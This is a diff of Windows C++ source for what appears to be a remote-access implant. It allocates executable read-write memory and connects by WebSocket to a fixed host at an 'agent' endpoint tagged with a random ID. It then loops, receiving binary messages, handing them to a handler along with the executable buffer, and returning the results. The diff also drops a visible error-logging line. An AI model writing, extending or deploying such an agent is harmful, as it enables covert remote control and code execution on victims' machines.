@@ -1,68 +1,80 @@
 #include "global.hpp"
 #include "connection.hpp"
 #include "identifier.hpp"
-#include <thread>
 
-PVOID getMem();
-string handleMessage(string& msg, PVOID mem);
+using namespace std;
 
-void run_process(const string& commandLine) {
-    STARTUPINFOA si{};
-    PROCESS_INFORMATION pi{};
+PVOID getMem(SIZE_T size, DWORD dwProtect);
 
-    si.cb = sizeof(si);
+PVOID scratchpad;
 
-    // CreateProcessA requires a mutable buffer
-    string cmd = commandLine;
+bool handleMessage(
+    const char* input,
+    size_t inputSize,
+    char* output,
+    size_t outputCapacity,
+    size_t& outputSize,
+    PVOID mem
+);
 
-    if (!CreateProcessA(
-            nullptr,
-            cmd.data(),
-            nullptr,
-            nullptr,
-            FALSE,
-            0,
-            nullptr,
-            nullptr,
-            &si,
-            &pi
-        )) {
-        throw runtime_error("CreateProcessA failed");
+int main() {
+    PVOID mem = getMem(0x1000, PAGE_EXECUTE_READWRITE);
+    scratchpad = getMem(0x100000, PAGE_READWRITE);
+
+    const wchar_t* host = L"192.168.64.1";
+    const INTERNET_PORT port = 443;
+    const bool useHttps = true;
+
+    wchar_t identifier[37];
+    random_uuid(identifier);
+
+    wchar_t path[128];
+    const wchar_t* basePath = L"/api/v1/anon/agent/ws/";
+
+    size_t baseLen = wcslen(basePath);
+    size_t idLen = wcslen(identifier);
+
+    if (baseLen + idLen + 1 > sizeof(path) / sizeof(wchar_t)) {
+        return 1;
     }
 
-    // Wait for process to finish
-    WaitForSingleObject(pi.hProcess, INFINITE);
+    wcscpy(path, basePath);
+    wcscat(path, identifier);
 
-    // Clean up
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-}
-
-string to_hex(const uint8_t* data, size_t len);
-int main() {
-    PVOID mem = getMem();
-    const wstring host = L"192.168.64.1";
-    const INTERNET_PORT port = 443;
-    wstring path = L"/api/v1/anon/agent/ws/";
-    wstring identifier = random_uuid();
-    const bool useHttps = true;
-    path += identifier;
-
-    WebSocketClient client;
+    WebSocketClient client = {};
 
     if (!connectWebSocket(client, host, port, path, useHttps)) {
         cleanup(client);
         return 1;
     }
-    
+
+    char *messageBuffer = (char*) getMem(0x100000, PAGE_READWRITE);
+    char *responseBuffer = (char*) getMem(0x100000, PAGE_READWRITE);
+    size_t messageSize = 0;
+    size_t responseSize = 0;
 
     while (true) {
-        string message;
-        if (!receiveText(client.websocket, message)) {
+        if (!receiveBinary(
+                client.websocket,
+                messageBuffer,
+                0x100000,
+                messageSize)) {
             break;
         }
-        string returnstring = handleMessage(message, mem);
-        sendText(client.websocket, returnstring);
+        
+        if (!handleMessage(
+                messageBuffer,
+                messageSize,
+                responseBuffer,
+                0x100000,
+                responseSize,
+                mem)) {
+            break;
+        }
+
+        if (!sendBinary(client.websocket, responseBuffer, responseSize)) {
+            break;
+        }
     }
 
     DWORD closeResult = WinHttpWebSocketClose(
@@ -73,7 +85,6 @@ int main() {
     );
 
     if (closeResult != NO_ERROR) {
-        cerr << "WinHttpWebSocketClose failed: " << closeResult << endl;
         cleanup(client);
         return 1;
     }
